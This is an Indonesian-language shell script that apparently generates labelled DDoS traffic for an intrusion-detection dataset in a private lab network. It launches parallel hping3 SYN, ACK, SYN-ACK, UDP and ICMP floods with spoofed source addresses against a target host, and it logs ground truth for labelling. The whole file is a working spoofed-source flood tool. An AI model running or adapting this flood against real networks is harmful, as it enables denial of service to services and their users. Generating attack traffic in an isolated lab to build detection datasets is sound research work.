#!/bin/sh
# serang_flood.sh — REVISI 2026-11-10 (anti-kebocoran label).
# Jalankan di Penyerang-1. DDoS flood dari banyak sumber palsu.
#   sh alias_ip.sh 192.168.20 11 30            # (scanner, dijalankan serang_scan.sh)
#   nohup sh serang_flood.sh 1800 > /tmp/flood_sesiX.log 2>&1 &
#
# PERUBAHAN PENTING vs versi lama:
#   1. Rentang IP sumber flood DIPISAH dari scanner: flood = .31-.250,
#      scanner (serang_scan.sh) = .11-.30. TIDAK ADA tumpang tindih, sehingga
#      label bisa ditentukan dari rentang IP sumber saja — lepas dari fitur
#      (menjawab koreksi Pak Deni: target leakage pada label).
#   2. Menulis LOG kebenaran-dasar (ground truth): waktu mulai/selesai sesi dan
#      satu baris per putaran (timestamp, jenis, jumlah burst, rentang sumber).
#      Log ini jadi "jadwal generator" untuk pelabelan & tabel parameter
#      (koreksi butir 29, 30).
#
# PENTING: reset collector sebelum sesi baru (hapus nfcapd lama / restart nfcapd)
# agar hitungan flow bersih.

TARGET=192.168.30.10
LAMA=${1:-1800}
SRC_LO=31          # oktet terakhir sumber flood (DIPISAH dari scanner .11-.30)
SRC_HI=250
SELESAI=$(( $(date +%s) + LAMA ))
rnd() { shuf -i "$1-$2" -n 1; }
dport() { case $(rnd 1 4) in 1|2) echo 80 ;; 3) echo 443 ;; 4) rnd 1 1024 ;; esac; }

echo "$(date +%s) flood MULAI dur=${LAMA}s src=192.168.20.${SRC_LO}-${SRC_HI} target=${TARGET}"

while [ "$(date +%s)" -lt "$SELESAI" ]; do
  case $(rnd 1 6) in                      # jenis flood
    1|2) MODE="-S" ;;          # SYN flood
    3)   MODE="-A" ;;          # ACK flood
    4)   MODE="-S -A" ;;       # SYN-ACK
    5)   MODE="--udp" ;;       # UDP flood
    6)   MODE="--icmp" ;;      # ICMP flood
  esac
  BATCH=$(rnd 10 20)                      # berapa burst paralel per putaran
  echo "$(date +%s) flood mode=\"$MODE\" batch=$BATCH src=192.168.20.${SRC_LO}-${SRC_HI}"
  k=0
  while [ $k -lt $BATCH ]; do
    SRC="192.168.20.$(rnd $SRC_LO $SRC_HI)"   # sumber palsu DIPISAH dari scanner
    SPORT=$(rnd 1025 60000)               # port sumber tetap per-burst -> 1 flow padat
    NPKT=$(rnd 30 250)                    # jumlah paket per flow (padat, bukan 1)
    LAJU="-i u$(rnd 800 8000)"            # 125-1250 paket/detik
    DATA=$(rnd 0 1200)                    # payload acak -> avg_packet_size bervariasi
    timeout 6 hping3 $MODE --keep -s "$SPORT" -p "$(dport)" -c "$NPKT" $LAJU -d "$DATA" \
      -a "$SRC" "$TARGET" >/dev/null 2>&1 &
    k=$((k + 1))
  done
  wait
  sleep "$(rnd 1 2)"
done

echo "$(date +%s) flood SELESAI"
